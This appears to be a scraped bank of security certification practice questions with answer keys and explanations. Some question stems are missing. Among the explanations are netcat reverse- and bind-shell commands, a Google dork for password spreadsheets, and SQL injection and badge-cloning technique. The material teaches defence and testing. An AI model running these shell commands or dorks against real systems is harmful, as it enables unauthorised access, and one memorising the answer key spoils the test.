Your company explicitly obtains permission from its customers to use their email address as an account identifier in its CRM. Max, who works at the marketing department in the company's German headquarters, just emailed all their customers to let them know about a new sales promotion this weekend. Which of the following privacy violations has occurred, if any?

- 

  There was no privacy violation since the customers were emailed securely through the customer relationship management tool

- 

  There was no privacy violation because only corporate employees had access to their email addresses

- 

  There was a privacy violation since data minimization policies were not followed properly

- 

  There was a privacy violation since the customers explicitly gave permission to use the email address as an identifier and did not consent to receive marketing emails

  (正確)

#### 解釋

OBJ-1.1: According to the European Union's General Data Protection Regulation (GDPR), personal data collected can only be used for the exact purpose in which explicit consent was obtained. To use email addresses for marketing purposes, separate explicit consent should have been obtained. Since the company operates in Germany, it must follow the GDPR privacy standard. Even if a company doesn't operate within the European Union, its customers might be European Union citizens, and therefore the company should still optional follow the GDPR guidelines. While data minimization is a good internal policy to utilize, not following it doesn't equate to a privacy violation or breach. Data minimization is the principle that data should only be processed and stored, if necessary, to perform the purpose for which it is collected. The option concerning the customer relationship management (CRM) tool is a distractor since the issue is using the data in ways that were not consented to by the customer, not which system the email was sent through. A privacy violation can occur when corporate employees view data if those employees do not have a need to know, a valid business requirement to use the data, or consent from the customer to use the data for a specific purpose (as was the case in this scenario).

You are working as a network administrator and are worried about the possibility of an insider threat. You want to enable a security feature that would remember the Layer 2 address first connected to a particular switch port to prevent someone from unplugging a workstation from the switch port and connecting their laptop to that same switch port. Which of the following security features would BEST accomplish this goal?

- 

  ACL

- 

  NAC

- 

  Port security

  (正確)

- 

  802.1x

#### 解釋

OBJ-4.2: Port security, also known as persistent MAC learning or Sticky MAC, is a security feature that enables an interface to retain dynamically learned MAC addresses when the switch is restarted or if the interface goes down and is brought back online. This is a security feature that can be used to prevent someone from unplugging their office computer and connecting their laptop to the network jack without permission since the switch port connected to that network jack would only allow the computer with the original MAC address to gain connectivity.

Fail to Pass Systems has just become the latest victim in a large-scale data breach by an APT. Your initial investigation confirms a massive exfiltration of customer data has occurred. Which of the following actions do you recommend to the CEO of Fail to Pass Systems in handling this data breach?

- 

  Provide a statement to the press that minimizes the scope of the breach

- 

  Purchase a cyber insurance policy, alter the date of the incident in the log files, and file an insurance claim

- 

  Conduct a ‘hack-back' of the attacker to retrieve the stolen information

- 

  Conduct notification to all affected customers within 72 hours of the discovery of the breach

  (正確)

#### 解釋

OBJ-1.1: Generally speaking, most laws require notification within 72 hours, such as the GDPR. All other options are either unethical, constitute insurance fraud, or are illegal. Conducting a hack-back is considered illegal, and once data has been taken, it is nearly impossible to steal it back as the attacker probably has a backup of it. Providing an incorrect statement to the press is unethical, and if your company is caught lying about the extent of the breach, it could further hurt your reputation. Purchasing a cyber insurance policy and altering the log file dates to make it look like the attack occurred after buying the policy would be insurance fraud. This is unethical and illegal.

You are working on a Hack the Box challenge on a Linux server owned by Dion Training. You have already gained initial access to the server and successfully elevated your privileges to root. As part of the challenge, you must find the date and time that a keyword was entered into the Linux server’s logs. Which of the following commands would successfully look through all the log files in "/var/log" for any references to "Terri" or "terri" on this Linux server?

- 

  find /var/log/ -exec grep -H -e "'terri' OR 'Terri'" {} \; 2> /dev/null

- 

  find /var/log/ -name "*.log" -exec grep -H -e "[Tt]erri" {} \; 2>/dev/null

- 

  find /var/log/ -name *.log -exec grep -H -e "'Terri' OR 'terri'" {} \; 2>/dev/null

- 

  find /var/log/ -exec grep -H -e "[Tt]erri" {} \; 2> /dev/null

  (正確)

#### 解釋

OBJ-5.2: The find command will by default look at every single file starting in a designated subdirectory (in this case /var/log) and will execute whatever command is specified between "-exec" and "\;" with the 'found' file being substituted for the "{}." Executing grep on every file with a parameter of -H will ensure the filename with the full path is displayed. The -e option in grep will use a REGEX expression. "[Tt]erri" is the correct REGEX expression to look for "Terri" or "terri." As many files in the /var/log directory do not end with the extension ".log," attempting to filter for just files with a .log extension will overly limit the results that are returned to you. "2> /dev/null" is needed to filter out any errors "find" might generate (such as attempting to open a directory). Now, let's talk about tackling this on test day because you don't need to have all of these things memorized to answer this question. Consider the four options presented to you and determine what is different in each one. You will notice every option starts with "fin /var/log" and ends with "{} \; 2>/dev/null", so you should mentally ignore that in each of the answers and focus on what is different. We also see that all the answers have "grep -H -e," so we aren't asked to be an expert on grep or its flags either, so mentally ignore that. This leaves us with two sets of differences. One set has "-name "*.log" versus "-exec." The second set of differences is "'Terri' OR 'terri'" or "[Tt]erri." From this, you can determine which regular express is correct ([Tt]erri) and eliminate 2 of the four choices. Now, you need to pick between the name and exec flags. If you know anything about Linux log files, you should remember that they usually don't end in .log as most Windows log files do, so we would pick exec if we had to guess.

A new corporate policy dictates that all access to network resources will be controlled based on the user's job functions and tasks within the organization. For example, only people working in Human Resources can access employee records, and only the people working in finance can access customer payment histories. Which of the following security concepts is BEST described by this new policy?

- 

  Permission creep

- 

  Blocklists

- 

  Least privilege

  (正確)

- 

  Directory permissions

#### 解釋

OBJ-4.2: Least privilege is the concept and practice of restricting access rights for users, accounts, and computing processes to only those resources absolutely required to perform routine, legitimate activities. Privilege itself refers to the authorization to bypass certain security restraints. Permissions Creep, also known as privilege creep, is what happens when an employee moves between roles in an organization and keeps the access or permissions of the previous role. Directory permissions are used to determine which users can access, read, write, and delete files or directories within a given directory. A blocklist is a list of IP addresses, ports, or applications that are not allowed to be run or used on a given system.

  ARP spoofing

- 

  Session hijacking

- 

  An evil twin

  (正確)

- 

  Amplified DNS attacks

#### 解釋

OBJ-3.2: An evil twin is the most common way to perform an on-path attack on a wireless network. An evil twin is a rogue wireless access point that masquerades as a legitimate Wi-Fi access point so that an attacker can gather personal or corporate information without the user's knowledge. A man-in-the-middle or on-path attack consists of sitting between the connection of two parties and either observing or manipulating traffic. This could be through interfering with legitimate networks or creating fake networks that the attacker controls. ARP spoofing, session hijacking, and amplified DNS attacks are not techniques specific to attacking wireless networks.

You are planning an engagement with a new client. Which target type should be selected to simulate an insider threat?

- 

  Internal

  (正確)

- 

  First-party hosted

- 

  Third-party hosted

- 

  External

#### 解釋

OBJ-1.2: An internal target type means that assets can be accessed from within the organization. This can either be physically or logically from within the network, and it best simulates an insider threat. This target type can also be used to simulate an external hacker who has gained credentials on the network, such as using a spear phishing attack. An external target type is an asset that can be accessed from outside of the organization. For example, if the webserver is visible on the Internet, it is considered an external target. First-party hosted targets are assets hosted by the client organization themselves. Third-party hosted targets are assets hosted by a vendor, partner, or cloud service provider.

You work for Dion Training as a physical security manager. You are concerned that the physical security at the entrance to the company is not sufficient. To increase your security, you are determined to prevent piggybacking. What technique should you implement first?

- 

  Install an RFID badge reader at the entrance

- 

  Install CCTV to monitor the entrance

- 

  Install an access control vestibule at the entrance

  (正確)

- 

  Require all employees to wear security badges when entering the building

#### 解釋

OBJ-4.2: An access control vestibule, or mantrap, is a device that only allows a single person to enter per authentication. This authentication can be done by RFID, a PIN, or other methods. Once verified, the mantrap lets a single person enter through a system, such as a turnstile or rotating door. CCTV will not stop piggybacking, but it could be used as a detective control after an occurrence. Wearing security badges is useful, but it won't stop piggybacking by a skilled social engineer. RFID badges may be used as part of your entry requirements, but it won't stop a determined piggyback who follows an employee into the building after their authenticated RFID access has been performed.

  nc -lp 31337 -e /bin/sh

- 

  nc 192.168.1.53 31337 –e /bin/sh

#### 解釋

OBJ-3.7: A reverse shell is established when the target machine communicates with an attack machine listening on a specific port. To set up a listener on the attack machine, you would use the command "nc -lp 31337" on it. To connect to the attacking machine from the victim machine, you would enter the command "nc 192.168.1.53 31337 –e /bin/sh" on it. A bind shell is established when a victim system "binds" its shell to a local network port. To achieve this using netcat, you should execute the command "nc -lp 31337 -e /bin/sh" on the victim machine. This sets up a listener on the machine on port 31337 and will execute the /bin/sh when another machine connects to its listener on port 31337. The attacker would enter the command "nc 192.168.1.53 31337" to connect to the victim's bind shell.

What best describes the meaning of this output?

- 

  There is an unknown bug in an Apache server with no Bugtraq ID

- 

  There is no CVE present, so this is a false positive caused by Apache running on a Windows server

- 

  Windows Defender has a known exploit that must be resolved or patched

- 

  Connecting to the host using a null session allows enumeration of the share names on the host

  (正確)

#### 解釋

OBJ-2.3: These results from the vulnerability scan conducted show an enumeration of open Windows shares on an Apache server. The enumeration results show three share names (print$, files, Temp) were found using a null session connection. There is no associated CVE with this vulnerability, but it is not a false positive. Not all vulnerabilities have a CVE associated with them. Nothing in this output indicates anything concerning Windows Defender, so this is not the correct answer. Bugtraq IDs are a different type of identification number issued for vulnerabilities by SecurityFocus. Generally, if there is a CVE, there will also be a Bugtraq ID. Both the CVE and Bugtraq ID being blank is not suspicious since we are dealing with a null enumeration result.

Which tool would allow you to identify the target's operating system by analyzing the TCP/IP stack responses?

- 

  scanf

- 

  dd

- 

  OllyDbg

- 

  nmap

  (正確)

#### 解釋

OBJ-5.3: The nmap tool can identify the target's operating system by analyzing the TCP/IP stack responses. Identification of the operating system relies on differences in how operating systems and operating system versions respond to a query, what TCP options they support, what order they send the packets in, and other details that, when combined, can provide a unique fingerprint for a given TCP stack. The dd tool is used to create disk images. The scanf function is a vulnerable input function in the C programming language. OllyDbg is a Windows-based debugger used for binary code analysis.

  Shoulder surfing

- 

  WEP attack

- 

  Evil twin

  (正確)

- 

  Rogue access point

#### 解釋

OBJ-3.2: An evil twin is meant to mimic a legitimate hotspot provided by a nearby business, such as a coffee shop that provides free Wi-Fi access to its patrons. An evil twin is a type of rogue wireless access point that masquerades as a legitimate Wi-Fi access point so that an attacker can gather personal or corporate information without the user's knowledge. This type of attack may be used to steal the passwords of unsuspecting users by monitoring their connections or phishing, which involves setting up a fraudulent website and luring people there. A rogue access point is an access point installed on a network without the network owner's permission. For example, if an employee connected a wireless access point to a wall jack in their office so that they can use their smartphone or tablet, this would be considered a rogue access point. Therefore, an evil twin is the better answer to this question since it is specifically being made to look like it belongs on the network by mimicking the SSID of the corporate network. A WEP attack is a brute force password attack conducted against a wireless network that relies on WEP for its encryption and security. Shoulder surfing is a type of social engineering technique used to obtain information such as personal identification numbers, passwords, and other confidential data by looking over the victim's shoulder.

  Inserting malicious JavaScript code into input parameters

- 

  Injecting parameters into a connection string using semicolons as a separator

  (正確)

- 

  Adding multiple parameters with the same name in HTTP requests

#### 解釋

OBJ-3.1: Connection String Parameter Pollution (CSPP) exploits specifically the semicolon-delimited database connection strings that are constructed dynamically based on the user inputs from web applications. CSPP, if carried out successfully, can be used to steal user identities and hijack web credentials. CSPP is a high-risk attack because of the relative ease with which it can be carried out (low access complexity) and the potential results it can have (high impact). Exploit chaining involves multiple commands and exploits being conducted in a series to fully attack or exploit a given target.

  The administrator of the affected application does not see an error message during a successful attack

- 

  The attacker cannot see any of the display errors with information about the injection during a blind attack

  (正確)

- 

  The administrator of the vulnerable application cannot see the request to the webserver

#### 解釋

OBJ-3.3: Blind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the application's response. This attack is often used when the web application is configured to show generic error messages but has not mitigated the code that is vulnerable to SQL injection.

During a penetration test, you identify evidence of a possible large-scale data breach. Based on the indicators of compromise you discovered, you believe that the attackers were able to successfully exfiltrate the personal information and social security numbers of the company’s customers from their database server. What action should you perform NEXT?

- 

  Complete your scheduled work on the penetration test for the day and inform the company’s technical point of contact at tomorrow’s daily standup

- 

  Pause any work on your penetration testing activities, patch the database server to protect it from further exploitation, and report your findings in your daily status report

- 

  Immediately stop any penetration testing activities involving the database server, notify the company’s primary contact, and add your findings to your daily status report

- 

  Immediately stop all penetration testing activity, notify the company’s emergency point of contact, and report any indicators of compromise you have found

  (正確)

#### 解釋

OBJ-1.3: As a penetration tester, you should immediately stop any penetration testing activities upon identifying a breach or other criminal activity. The penetration tester should contact the company’s emergency point of contact provided in the scoping documents and wait for further guidance. The penetration tester should not continue any work as this could make it more difficult for the network defenders to identify the true source of the breach or criminal activity. The penetration testers should never take it upon themselves to patch a server during an engagement.

Which of the following tools provides a penetration tester with Python classes with low-level program access to packets, protocols, and their implementation?

- 

  Impacket

  (正確)

- 

  Responder

- 

  Searchsploit

- 

  Empire

#### 解釋

OBJ-5.3: Impacket is a collection of Python classes that provide low-level program access to packets, as well as to protocols and their implementation. Empire (PowerShell Empire) is a post-exploitation framework for Windows devices that allows the attacker to run PowerShell agents without needing powershell.exe. It is commonly used to escalate privileges, launch other modules to capture data, extract passwords, and install persistent backdoors. Searchsploit is a tool included in the exploitdb package on Kali Linux that enables you to search the Exploit Database archive. Responder is a fake server and relay tool that is included with Kali Linux. It responds to LLMNR, NBT-NS, POP, IMAP, SMTP, and SQL queries to recover sensitive information such as user names and passwords.

  Session hijacking

- 

  SQL injection

- 

  Information disclosure

  (正確)

- 

  Local file inclusion

#### 解釋

OBJ-2.4: Information disclosure is any condition that allows the attacker to gain access to protected information. In this case, the server is vulnerable to disclosing information about the version of PHP being used. The phpinfo.php file should not be accessible to remote users over the internet, as it can be used to provide them with valuable information to help plan an attack.

Which of the following methods should a cybersecurity analyst use to locate any instances on the network where passwords are being sent in cleartext?

- 

  Net flow capture

- 

  Software design documentation review

- 

  Full packet capture

  (正確)

- 

  SIEM event log monitoring

#### 解釋

OBJ-2.2: Full packet capture records the complete payload of every packet crossing the network. The other methods will not provide sufficient information to detect a cleartext password being sent. A net flow analysis will determine where communications occurred, by what protocol, to which devices, and how much content was sent. Still, it will not reveal anything about the content itself since it only analyzes the metadata for each packet crossing the network. A SIEM event log being monitored might detect that an authentication event has occurred. Still, it will not necessarily reveal if the password was sent in cleartext, as a hash value, or in the ciphertext. A software design documentation may also reveal the designer's intentions for authentication when they created the application, but this only provides an ‘as designed’ approach for a given software and does not provide whether the ‘as-built’ configuration was implemented securely.

Your organization's networks contain 4 subnets: 10.0.0.0, 10.0.1.0, 10.0.2.0, and 10.0.3.0. Using nmap, how can you scan all 4 subnets using a single command?

- 

  nmap -Pn 10.0.0.0/23

- 

  nmap -Pn 10.0.0-3.0

  (正確)

- 

  nmap -Pn 10.0.0.0/25

- 

  nmap -Pn 10.0.0.0,1.0,2.0,3.0

#### 解釋

OBJ-2.4: The simplest way to scan multiple subnets adjacent to each other is to use the -Pn tells the command to conduct a host-only scan of every IP in this target space without using ping. Using the dash (-) in the IP address means to scan "this network through this network." So, 10.0.0-3.0 will scan every IP from 10.0.0.0 through 10.0.3.255.

Then, you clicked the search button, and a pop-up box appears on your screen showing the following text, "This site is vulnerable to an attack!" Based on this response, what vulnerability have you uncovered in the web application?

- 

  Cross-site scripting

  (正確)

- 

  Buffer overflow

- 

  Distributed denial of service

- 

  Cross-site request forgery

#### 解釋

OBJ-3.3: This is a form of Cross-Site Scripting (XSS). Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. Attackers may use a cross-site scripting vulnerability to bypass access controls such as the same-origin policy. Cross-site request forgery (CSRF or XSRF) is a malicious exploit of a website where unauthorized commands are transmitted from a user that the web application trusts. There are many ways in which a malicious website can transmit commands, such as specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests can all work without the user's interaction or even knowledge. A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic. A buffer overflow is an anomaly that occurs when a program overruns the buffer's boundary and overwrites adjacent memory locations while writing data to a buffer.

An organization is currently accepting bids for a contract that will involve penetration testing and reporting. The organization is asking all bidders to provide proof of previous penetration testing and reporting experience. One contractor decides to print out a few reports from some previous penetration tests that they performed. What could have occurred as a result of this contractor's actions?

- 

  The contractor may have inadvertently exposed numerous vulnerabilities they had found at other companies on previous assessments

  (正確)

- 

  The contractor will have their bid accepted with a special pay bonus because of their excellent work on previous penetration tests

- 

  The company accepting the bids will hire the contractor because of the quality of the reports he submitted with his bid

- 

  The organization accepting the bids will want to use the reports as an example of the format for all bidders to use in the future

#### 解釋

OBJ-1.3: Pentesters should never disclose any information from previous penetration tests to anyone outside of the assessed organization since this could expose the vulnerability found. This non-disclosure is usually outlined in the original contract and scope of work. If the contractor wishes to provide a sample report, then the report should be created specifically for the contract and only include information from a sample/test network, not a previous customer’s assessment. This could also be in breach of the NDA between the pentester and the organization, as well.

During an assessment of the POS terminals that accept credit cards, a cybersecurity analyst notices a recent Windows operating system vulnerability exists on every terminal. Since these systems are all embedded and require a manufacturer update, the analyst cannot install Microsoft's regular patch. Which of the following options would be best to ensure the system remains protected and are compliant with the rules outlined by the PCI DSS?

- 

  Replace the Windows POS terminals with standard Windows systems

- 

  Remove the POS terminals from the network until the vendor releases a patch

- 

  Identify, implement, and document compensating controls

  (正確)

- 

  Build a custom OS image that includes the patch

#### 解釋

OBJ-4.2: Since the analyst cannot remediate the vulnerabilities by installing a patch, the next best action would be to implement some compensating controls. If a vulnerability exists that cannot be patched, compensating controls can mitigate the risk. Additionally, the analyst should document the current situation to achieve compliance with PCI DSS. The analyst will likely not remove the terminals from the network without affecting business operations, so this is a bad option. The analyst should not build a custom OS image with the patch since this could void the support agreement with the manufacturer and introduce additional vulnerabilities. Also, it would be difficult (or impossible) to replace the POS terminals with standard Windows systems due to the custom firmware and software utilized on these systems.

Which of the following responses would you expect to receive from this command?

- 

  Server: DionTraining ESMTP Postfix (Ubuntu)

  (正確)

- 

  Server: Microsoft-IIS/8.5

- 

  Server: vsFTPd-3.0.3

- 

  Server: SSH-2.0-OpenSSH 7.4

#### 解釋

OBJ-2.3: The nc (netcat) command is useful in conducting banner grabbing. To use netcat for banner grabbing, simply enter “nc -v IP PORT” where IP is the IP address and PORT is the port number of the service being tested. In this scenario, netcat is being used to banner grab the server on port 25, therefore you should expect the result to be an SMTP (sendmail) server.

You are conducting a social engineering attack against an organization as part of an engagement. You walk into the break room and see a couple of system administrators talking about the previous weekend's football game. You listen for a moment as the two argue over whose team was better. You notice that one of the guys is about your age and talks fast. You walk over and immediately start talking fast, backing up this guy's claims about his team, and joking around with him. After they are done talking about football, you comment about how Linux servers are so much better than Windows to see his response as you try to figure out the server types used at this organization. What type of social engineering principle is being exploited here?

- 

  Authority

- 

  Intimidation

- 

  Likeness

  (正確)

- 

  Scarcity

#### 解釋

OBJ-3.6: Likeness is the social engineering motivational technique that relies on people being more willing to help people who look and sound like themselves. In this scenario, the social engineer started talking sports and acting like the victim he sought to exploit. He then started making jokes about different server types to see if he could gain some information from the victim. Authority is used to take advantage of people's willingness to act when directed to by someone with the power or right to give orders. For example, an attacker may pose as a police officer, government agent, or high-level executive to force an employee to take some form of action, whether it is ethically dubious or counter to their interests. Scarcity is used to create a fear in a person of missing out on a special deal or offer. This technique is used in advertising all the time, such as "supplies are limited," "only available for the next 4 hours", and other such artificial limitations being used.

Your organization is preparing for its required quarterly PCI DSS external vulnerability scan. Who is authorized to perform this scan?

- 

  Only employees of the company

- 

  Anyone

- 

  Any qualified individual

- 

  Only an approved scanning vendor

  (正確)

#### 解釋

OBJ-1.1: The Payment Card Industry Data Security Standard (PCI-DSS) is a prescriptive framework. It is not a law but a formal policy created by the credit card industry that organizations must follow to accept credit and bank cards for payment. Quarterly required external vulnerability scans must be run by a PCI-DSS approved scanning vendor (ASV). This question may seem beyond the scope of the exam. Still, the objectives allow for "other examples of technologies, processes, or tasks about each objective may also be included on the exam although not listed or covered" in the objectives' bulletized lists. The content examples listed in the objectives are meant to clarify the test objectives and should not be construed as a comprehensive listing of this examination's content. Therefore, questions like this are fair game on test day. That said, your goal isn’t to score 100% on the exam; it is to pass it. Don't let questions like this throw you off on test day. If you aren't sure, take your best guess and move on!

Dion Training has hired you to assess its voucher fulfillment web application on its e-commerce website. The web application relies on a SOAP-based web service. Which of the following support resources would be MOST helpful in conducting this known-environment assessment?

- 

  WSDL document

  (正確)

- 

  XSD file

- 

  Swagger document

- 

  SDK documentation

#### 解釋

OBJ-1.2: The WSDL (Web Services Description Language) document is an XML formatted document defining a web service's capabilities and how to access it. Since this scenario states that the company relies on a SOAP-based web service, the assessment's best support resource would be a copy of their WSDL document. A swagger document is the REST API equivalent of a WSDL document that defines a SOAP-based web service. SDK documentation is used to document the software development kit and is not relevant to the SOAP-based web service being tested. An XML Schema Definition (XSD) is a recommendation that enables developers to define the structure and data types for XML documents.

Raj is working to deploy a new vulnerability scanner for an organization. He wants to verify the information he gets is the most accurate view of the configurations on the organization's traveling salespeople's laptops to determine if any configuration issues could lead to new vulnerabilities. Which of the following technologies would work BEST to collect the configuration information in this situation?

- 

  Server-based scanning

- 

  Agent-based scanning

  (正確)

- 

  Passive network monitoring

- 

  Non-credentialed scanning

#### 解釋

OBJ-2.4: Using agent-based scanning, you typically get the most reliable results for systems that are not connected to the network, as well as the ones that are connected. This is ideal for traveling salespeople since their laptops are not constantly connected to the organization’s network. These agent-based scans can be conducted when the laptop is offline and then sent to a centralized server the next time it is connected to the network. Server-based scanning, non-credentialed scanning, and passive network monitoring require a continuous network connection to collect the devices' configurations accurately.

- 

  Excludes Microsoft Excel spreadsheets

- 

  All search filters are deactivated

- 

  Returns only files hosted at diontraining.com

  (正確)

#### 解釋

OBJ-2.1: The above example searches for files with the name "password" in them (q=password) and (+) have a filetype equal to xls (filetype%3Axls, %3A is the hex-code for ':') and (+) limits the results to files hosted on diontraining.com (site%3Adiontraining.com) and (&) disables personalization (pws=0) and (&) deactivates the directory filtering function (filter=p). If you wanted to exclude Microsoft Excel spreadsheets, this would be done by typing -filetype%3Axls as part of the search query. To find related websites or pages, you would include the "related:" term to the query. To deactivate all filters from the search, the "filter=0" should be used. To deactivate the directory filtering function, the "filter=p" is used.

During a recent penetration test, it was discovered that your company's wireless network could be reached from the parking lot. The Chief Security Officer has submitted a change request to your network engineering team to solve this issue because he wants to ensure that the wireless network is only accessible from within the building. Based on these requirements, which of the following settings should be changed to ensure the wireless signal doesn't extend beyond your building's interior while maintaining a high level of availability to your users?

- 

  Frequency

- 

  Power level

  (正確)

- 

  Channel

- 

  Encryption

#### 解釋

OBJ-4.2: The power level should be reduced for the radio transmitter in the wireless access points. With a reduced power level, the signal will not travel as far. You can ensure the signal remains within the building's interior only by conducting a site survey and adjusting the power levels of each wireless access point. The other options, if changed, would affect the availability of the network, and it would not dramatically affect the distance the signal travels.

Windows file servers commonly hold sensitive files, databases, passwords, and more. What common vulnerability is usually used against a Windows file server to expose sensitive files, databases, and passwords?

- 

  SQL injection

- 

  Cross-site scripting

- 

  Missing patches

  (正確)

- 

  CRLF injection

#### 解釋

OBJ-4.2: Missing patches are the most common vulnerability found on both Windows and Linux systems. When a security patch is released, attackers begin to reverse engineer the security patch to exploit the vulnerability. If your servers are not patched against the vulnerability, they can become victims of the exploit, and the server's data can become compromised. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. Cross-site scripting focuses on exploiting a user’s workstation, not a server. CRLF injection is a software application coding vulnerability that occurs when an attacker injects a CRLF character sequence where it is not expected. SQL injection is the placement of malicious code in SQL statements via web page input. SQL is commonly used against databases, but they are not useful when attacking file servers.

  (正確)

- 

  Driver’s license numbers

- 

  Insurance records

- 

  Medical records

#### 解釋

OBJ-1.1: The Payment Card Industry Data Security Standard (PCI DSS) is an information security standard for organizations that handle branded credit cards from the major card schemes. The PCI Standard is mandated by the card brands but administered by the Payment Card Industry Security Standards Council. As part of PCI DSS compliance, organizations must conduct internal and external scans at prescribed intervals on any devices or systems that process credit card data. HIPAA protects medical and insurance records, but this law doesn't define a frequency for vulnerability scanning requirements. Driver's license numbers are considered PII, but again, there is no defined frequency scanning requirement regarding protecting PII under law, regulation, or rule.

  Connect a wireless access point to the conference room's network jack

- 

  Poison or overflow the MAC table of the switch

  (正確)

#### 解釋

OBJ-3.1: VLAN hopping is the act of illegally moving from one VLAN to another. A VLAN (virtual LAN) is a logical grouping of switch ports extending across any number of switches on an Ethernet network. One of the most common VLAN hopping methods is to overflow the MAC table on a vulnerable switch. When this occurs, the switch defaults to operating as a hub and repeats all frames being received through all of its ports. This "fail open" method ensures the network can continue to operate, but it is a security risk that can be exploited by the penetration tester.

Which of the following is a special type of embedded operating system that uses a predictable and consistent scheduler?

- 

  Mobile

- 

  RTOS

  (正確)

- 

  IoT

-

#### 解釋

OBJ-3.5: A real-time operating system (RTOS) is a special type of embedded OS. An RTOS is ideal for embedded systems because they tend to have strict requirements for when a task should be completed and do not have particularly taxing workloads. An RTOS uses a predictable and consistent scheduler, unlike a general-purpose OS like Windows or macOS.

You are conducting reconnaissance against Dion Training for an upcoming engagement. Last week, you read a press release on their website that mentioned a new security infrastructure being deployed soon, but you cannot remember the exact date for the deployment. You tried to navigate back to the press release on their website, but it seems to have been taken down. Which of the following can you use to find a copy of the press release? (Select TWO)

- 

  Use a network sniffer to capture API requests and responses from the site

- 

  Use a standard cache search by entering cache:https://diontraining.com

  (正確)

- 

  Conduct a website crawl of https://diontraining.com to find the hidden document

- 

  Use a website archive like archive.org to find a copy of the press release

  (正確)

#### 解釋

OBJ-2.1: To obtain older website information, you can use a standard cache search or a website archive. A standard cache search will produce a recent view of the website, but if the document you need has been removed for a long time this will be ineffective. Website archives like archive.org (home of the Wayback Machine) create cached and archived copies of billions of web pages going back decades. A network sniffer to capture API requests and responses is a form of active reconnaissance but it would not be useful in finding a specific webpage like the press release in this scenario. Conducting a website crawl can find hidden documents that are not indexed by search engines, but it will not find a document that has been removed or taken offline.

You are performing a web application security test, notice that the site is dynamic, and must be using a back-end database. You decide you want to determine if the site is susceptible to an SQL injection. What is the first character that you should attempt to use in breaking a valid SQL request?

- 

  Exclamation mark

- 

  Semicolon

- 

  Double quote

- 

  Single quote

  (正確)

#### 解釋

OBJ-3.5: The single quote character (') is the character limiter in SQL. With a single quote,' you delimit strings, and therefore you can test whether the programmer has properly escaped the strings in the targeted application. If not escaped directly, you can end any string supplied to the application and add other SQL code after it. This is a common technique for SQL injections. A semicolon is a commonly used character at the end of a line of code or command in many programming languages. An exclamation mark comments a line of code in several languages. Double quotes contain a string that is passed to a variable.

- 

  Modifying log files

  (正確)

#### 解釋

OBJ-4.4: Pentesters rarely need to modify log files, and it should not be conducted after an assessment/engagement has occurred. When an assessment is complete, the pentester should remove any shells, tester-created credentials, or tools from the victimized hosts to ensure an attacker does not utilize them against the organization, too.

A penetration tester is using a known vulnerability to compromise an Apache webserver. After they gain access to the webserver, what is their next step to pivot to a protected system outside of the screened subnet?

- 

  Vulnerability scanning

- 

  Privilege escalation

  (正確)

- 

  Installing additional tools

- 

  Patching

#### 解釋

OBJ-3.7: Apache web servers are run as a limited user by default, not as an administrative or root account. To be efficient and effective, the penetration tester should attempt to conduct a privilege escalation before pivoting into the screened subnet. As a penetration tester, they would not likely patch the system, conduct a vulnerability scan, or install additional tools. This does not help them achieve their goal of pivoting out of the screened subnet.

Your service desk has received many complaints from external users that a web application is responding slowly to requests and frequently receives a “connection timed out” error message when they attempt to submit information to the application. Which software development best practice should have been implemented to prevent this from occurring?

- 

  Fuzzing

- 

  Regression testing

- 

  Stress testing

  (正確)

- 

  Input validation

#### 解釋

OBJ-3.1: Stress testing is a software testing activity that determines the robustness of software by testing beyond normal operating limits. Stress testing is essential for mission-critical software but can be used with all types of software. Stress testing is an important component of the capacity management process of IT service management. It ensures adequate resources are available to support the end user's needs when an application goes into a production environment. Regression testing confirms that a recent program or code change has not adversely affected existing features. Input validation is the process of ensuring any user input has undergone cleansing to ensure it is properly formatted, correct, and useful. Fuzzing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program.

You are scheduled to conduct a physical penetration test against an organization. You need to access the building during business hours and in the evening, even if none of the employees are on-site. Which of the following methods would be the MOST effective to utilize?

- 

  Fence jumping

- 

  Lock picking

- 

  Badge cloning

  (正確)

- 

  Tailgating

#### 解釋

OBJ-3.6: Radio-frequency identification (RFID) is a standard for identifying and keeping track of an object's physical location through the use of radio waves. RFID cloning is the act of copying authentication data from an RFID badge's microchip to another badge. In an attack scenario, badge cloning is useful because it enables the attacker to obtain authorization credentials without stealing a physical badge from the organization. Badge cloning can be done through handheld RFID writers, which are inexpensive and easy to use. You hold the badge up to the RFID writer device, press a button to copy its tag's data, then hold a blank badge up to the device, and write the copied data. RFID cloning tools can read the data like any normal RFID reader would and be located up to several feet away or inside a bag. Tailgating is a social engineering technique to gain access to a building by following someone unaware of their presence. Lock picking is a skill using specialized tools to manipulate the components of a lock to gain access to a restricted area. Fence jumping involves climbing over a fence to breach the physical perimeter of a building. Fence jumping and lock picking would not be effective during normal business hours. Tailgating would not be effective after normal business hours.

  Level 4

  (正確)

- 

  Level 2

- 

  Level 1

- 

  Level 3

#### 解釋

OBJ-1.1: This is a level 4 merchant. Under the PCI-DSS compliance rules, a merchant who is categorized as a level 2, level 3, or level 4 must have an external auditor conduct an annual audit or submit documentation of a self-test proving they took active steps to secure their credit card processing infrastructure. Level 1 is a large merchant with over 6,000,000 transactions per year. Level 2 is a merchant with 1,000,000 to 5,999,999 transactions per year. Level 3 is a merchant with 20,000 to 1,000,000 transactions per year. Level 4 is a small merchant with under 20,000 transactions per year.

Based on the query above, which of the following potential indicators of compromise is the threat hunter relying on?

- 

  Unauthorized software

  (正確)

- 

  Irregular peer-to-peer communication

- 

  Data exfiltration

- 

  Processor consumption

#### 解釋

OBJ-3.7: This is a difficult question, but you should see a keyword in the query, "mimikatz." Mimikatz is a leading post-exploitation tool that dumps passwords from memory, as well as hashes, PINs, and Kerberos tickets. Other useful attacks it enables are pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. This makes post-exploitation lateral movement within a network easy for attackers. It is considered unauthorized software and should be immediately alerted upon if discovered in your network. Data exfiltration is the process by which an attacker takes data that is stored inside of a private network and moves it to an external network. Processor consumption is an IoC that monitors the per-process percentage of CPU time to show what causes the problem. Irregular peer-to-peer communication occurs when hosts within a network establish connections over unauthorized ports or data transfers.

